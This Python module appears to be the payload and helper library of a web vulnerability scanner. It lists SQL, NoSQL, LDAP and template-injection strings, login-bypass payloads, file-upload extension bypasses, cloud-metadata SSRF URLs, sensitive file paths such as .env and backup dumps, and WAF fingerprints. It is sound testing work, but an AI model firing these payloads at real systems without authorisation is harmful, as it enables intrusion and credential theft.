"""Deep shared: payload constants + form/login helpers (no checks)."""
from __future__ import annotations

import re
from urllib.parse import urlparse, parse_qs


# WAF-bypass encodings (the wrapper changes, not the payload itself)
def encoded_variants(payload: str) -> list[str]:
    from urllib.parse import quote
    return list(dict.fromkeys([
        payload,
        quote(payload, safe=""),          # tek URL-encode: ' -> %27
    ]))


# Blind boolean payload pairs: (true, false)
BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ('" AND "1"="1', '" AND "1"="2'),
]

# NoSQL operator pairs for query-param morphing: (true_op, false_op, value).
# true should behave like "match something"; false like "match nothing".
NOSQLI_OP_PAIRS = [
    ("[$ne]", "[$eq]", "gash_nosqli_never"),
    ("[$gt]", "[$lt]", ""),
]
NOSQLI_JSON_TRUE = '{"$ne": null}'
NOSQLI_JSON_FALSE = '{"$eq": "gash_nosqli_never_match"}'
NOSQLI_ERR = re.compile(
    r"MongoError|MongoServerError|Cast to ObjectId failed|"
    r"BSONTypeError|bad query|\$where|unexpected token \$|"
    r"org\.springframework\.data\.mongodb|"
    r"com\.mongodb\.|Invalid BSON|unknown operator",
    re.I)

# Time-based: one payload per engine, short sleep (stay fast)
TIME_PAYLOADS = ["' OR SLEEP(3)-- -", "';SELECT pg_sleep(3)--",
                 "';WAITFOR DELAY '0:0:3'--"]
TIME_SLEEP = 3.0

SSTI_PAIR = (7719, 7919)  # product computed live (kills FPs)
# polyglot bundles: 2 engines per request (for speed)
SSTI_BUNDLES = ["{{A*B}}${A*B}", "#{A*B}<%= A*B %>", "__${A*B}__[*{A*B}]"]

SSRF_KEYS = {"url", "uri", "redirect", "next", "callback", "webhook",
             "feed", "file", "path", "dest", "domain", "host",
             "continue", "return", "link", "src"}
SSRF_META_URL = "http://169.254.169.254/latest/meta-data/ami-id"
SSRF_MARKERS = ["ami-", "instance-id", "meta-data", "computeMetadata",
                "metadata.google.internal", "placement/availability-zone"]
AWS_AMI_ID_RE = re.compile(r"\bami-[0-9a-f]{8,}\b", re.I)
# Azure IMDS needs the Metadata header, otherwise it 400s even when reachable.
AZURE_META_URL = ("http://169.254.169.254/metadata/instance"
                  "?api-version=2021-02-01")
AZURE_MARKERS = ["azenvironment", '"compute"', "az environment"]
# GCP needs Metadata-Flavor and returns a bare numeric instance id.
GCP_META_URL = "http://metadata.google.internal/computeMetadata/v1/instance/id"

IDOR_RE = re.compile(r"(/api/[\w\-/]*?/)(\d+)([/?#]|$)", re.I)
# Only identifier-like names are tested (paging params
# like page/limit/year are filtered out).
IDOR_PARAM_RE = re.compile(r"(^id$|_id$|^user_?id$|uuid|guid$)", re.I)


def _bodies_differ(b1: str | None, b2: str | None) -> bool:
    """True only if two bodies differ beyond the IDs themselves.

    Length alone is weak evidence (two public product pages always differ).
    The digit-normalized similarity must also drop — otherwise the only
    difference is the echoed id, which proves nothing.
    Delegates to the shared differential engine (no local thresholds).
    """
    from core.diff import bodies_differ
    return bodies_differ(b1, b2)


PP_PAYLOADS = ["__proto__[gashpp]=1", "constructor[prototype][gashpp]=1"]

UPLOAD_BYPASS_NAMES = [
    "gash_probe.txt",        # control: is the endpoint alive?
    "gash_probe.php",        # control: plain php accepted? (direct critical)
    "gash_probe.phtml",      # alternate PHP handler
    "gash_probe.php5",       # legacy handler
    "gash_probe.png.php",    # double extension
    "gash_probe.svg",        # script-carrying image (stored XSS proof)
]
UPLOAD_OK_HINT = re.compile(r"upload|success|\bok\b|done|saved|file", re.I)
UPLOAD_BLOCK_HINT = re.compile(r"block|forbidden|not allowed|invalid|denied|error", re.I)

# Tech fingerprint -> nokta-atisi ek yollar
SMART_PATHS = {
    "node": ["package.json", "yarn.lock", ".env", "server.js", "app.js", ".npmrc"],
    "php": [".git/config", "wp-config.php.bak", ".env", "composer.json",
            "config.php.bak", "index.php.bak", "index.php.old"],
    "java": ["WEB-INF/web.xml", "actuator/env", "actuator/health", ".env"],
    "python": [".env", "settings.py.bak", "requirements.txt", "config.py.bak"],
    "wordpress": ["wp-config.php.bak", "wp-content/debug.log", ".env", "license.txt"],
    "nextjs": ["package.json", ".env", ".env.local"],
    # Atlassian Data Center / Server — status + classic login surfaces
    "atlassian": ["status", "server-info.action", "rest/api/latest/serverInfo",
                  "login.action", "secure/Dashboard.jspa",
                  "WEB-INF/web.xml", "crowd.properties"],
    "confluence": ["status", "rest/api/content", "login.action"],
    "jira": ["status", "rest/api/latest/serverInfo", "secure/Dashboard.jspa"],
    "bitbucket": ["status", "rest/api/latest/application-properties"],
    # Denodo Scheduler — login + Kerberos settings surface (read-only paths)
    "denodo": ["denodo-scheduler", "scheduler", "webadmin",
               "login.xhtml", "kerberos-settings"],
    "backup": ["backup.zip", "www.zip", "site.zip", "db.sql", "dump.sql",
               "backup.tar.gz", "old.zip", "test.zip"],
}
TECH_MARKERS = [
    ("wordpress", ["wp-content", "wp-includes", "wp-json"]),
    ("nextjs", ["_next/static", "__NEXT_DATA__"]),
    ("node", ["express", "x-powered-by: express"]),
    ("php", ["x-powered-by: php", "phpsessid", "wordpress"]),
    ("java", ["jsessionid", "x-powered-by: servlet", "spring", "actuator"]),
    ("python", ["csrftoken", "django", "wsgi", "flask"]),
    ("confluence", ["confluence", "ajs-page-title",
                    "com.atlassian.confluence"]),
    ("jira", ["jira.webresources", "/secure/dashboard.jspa",
              "com.atlassian.jira"]),
    ("bitbucket", ["bitbucket", "stash-base-url",
                   "com.atlassian.bitbucket"]),
    ("atlassian", ["atlassian", "atl-token", "x-aserver"]),
    ("denodo", ["denodo", "denodo-scheduler", "com.denodo",
                "keytabfile", "keytab"]),
]

LOGIN_PAYLOADS = ["admin' OR '1'='1", "' OR '1'='1' -- "]
LOGIN_OK = ["logout", "log out", "sign out", "welcome", "account history",
            "dashboard", "my account", "myaccount", "members area"]
LOGIN_INPUT_RE = re.compile(
    r'<input[^>]*type=["\']?(\w+)["\']?[^>]*name=["\']([^"\']+)["\']', re.I)
LOGIN_INPUT_RE2 = re.compile(
    r'<input[^>]*name=["\']([^"\']+)["\'][^>]*type=["\']?(\w+)["\']?', re.I)

LOGIN_USER_HINTS = ["invalid username", "unknown user", "user not found",
                    "no such user", "username does not exist",
                    "account does not exist"]
LOGIN_PASS_HINTS = ["invalid password", "wrong password",
                    "incorrect password"]


def _param_names(url: str) -> list[str]:
    try:
        return list(parse_qs(urlparse(url).query, keep_blank_values=True).keys())
    except Exception:
        return []


def _login_fields(chunk: str) -> tuple[dict[str, str], dict[str, str]]:
    """Parse a login form chunk -> (fields name->type, hidden name->value)."""
    fields: dict[str, str] = {}
    for mm2 in list(LOGIN_INPUT_RE.finditer(chunk)) + \
               [(b, a) for a, b in LOGIN_INPUT_RE2.findall(chunk)]:
        t, n = mm2 if isinstance(mm2, tuple) else (mm2.group(1), mm2.group(2))
        fields[n] = (t or "text").lower()
    hidden_vals: dict[str, str] = {}
    for hm in re.finditer(
            r'<input[^>]*type=["\']?hidden["\']?[^>]*>', chunk, re.I):
        tag = hm.group(0)
        nm = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
        vm = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
        if nm:
            hidden_vals[nm.group(1)] = vm.group(1) if vm else ""
    return fields, hidden_vals


def _scrub_hidden(body: str, hidden_vals: dict[str, str]) -> str:
    """Blank rotating CSRF tokens so length comparisons stay meaningful."""
    from core.diff import scrub_tokens
    return scrub_tokens(body, (hidden_vals or {}).values())


LDAP_BYPASS_USERS = ["*", "admin*", "*)(", "*)(uid=*))("]

WAF_SIGNS = [
    ("Cloudflare", ["cf-ray", "cf-cache-status", "__cfduid", "cf_clearance",
                    "server: cloudflare", "cf-mitigated"]),
    ("AWS WAF/CloudFront", ["x-amz-cf-id", "x-amzn-requestid", "awselb", "awselb/2.0"]),
    ("Akamai", ["akamai", "x-akamai", "ak_bmsc", "bm_sv", "_abck"]),
    ("Imperva/Incapsula", ["incap_ses", "visid_incap", "x-cdn", "x-iinfo"]),
    ("Sucuri", ["x-sucuri-id", "x-sucuri-cache", "sucuri"]),
    ("F5 BIG-IP", ["bigipserver", "bigip", "x-waf-event", "f5-"]),
    ("Fortinet FortiWeb", ["fortiwaf", "fgts", "fortigate"]),
    ("Barracuda", ["barra_counteression", "barracuda"]),
    ("Wordfence", ["wfvt_", "wordfence", "wfwaf"]),
    ("ModSecurity", ["mod_security", "modsecurity", "x-waf-status"]),
    ("Azure WAF", ["x-azure-ref", "azure", "x-fd-"]),
    ("Google Cloud Armor", ["x-cloud-trace-context", "via: 1.1 google"]),
]

# JSON/base64 upload field names worth probing (deep only, benign text).
UPLOAD_JSON_FIELDS = {"file", "upload", "image", "avatar", "photo",
                      "document", "attachment", "content", "data", "blob",
                      "picture", "media", "filedata", "imageData"}

_UPLOAD_URL_HINT = re.compile(r"upload|avatar|media|attach|image", re.I)


__all__ = [
    "encoded_variants",
    "BOOLEAN_PAIRS", "TIME_PAYLOADS", "TIME_SLEEP",
    "NOSQLI_OP_PAIRS", "NOSQLI_JSON_TRUE", "NOSQLI_JSON_FALSE", "NOSQLI_ERR",
    "SSTI_PAIR", "SSTI_BUNDLES",
    "SSRF_KEYS", "SSRF_META_URL", "SSRF_MARKERS", "AWS_AMI_ID_RE",
    "AZURE_META_URL", "AZURE_MARKERS", "GCP_META_URL",
    "IDOR_RE", "IDOR_PARAM_RE",
    "_bodies_differ", "_param_names",
    "PP_PAYLOADS",
    "UPLOAD_BYPASS_NAMES", "UPLOAD_OK_HINT", "UPLOAD_BLOCK_HINT",
    "SMART_PATHS", "TECH_MARKERS",
    "LOGIN_PAYLOADS", "LOGIN_OK", "LOGIN_INPUT_RE", "LOGIN_INPUT_RE2",
    "LOGIN_USER_HINTS", "LOGIN_PASS_HINTS",
    "_login_fields", "_scrub_hidden",
    "LDAP_BYPASS_USERS", "WAF_SIGNS",
    "UPLOAD_JSON_FIELDS", "_UPLOAD_URL_HINT",
]
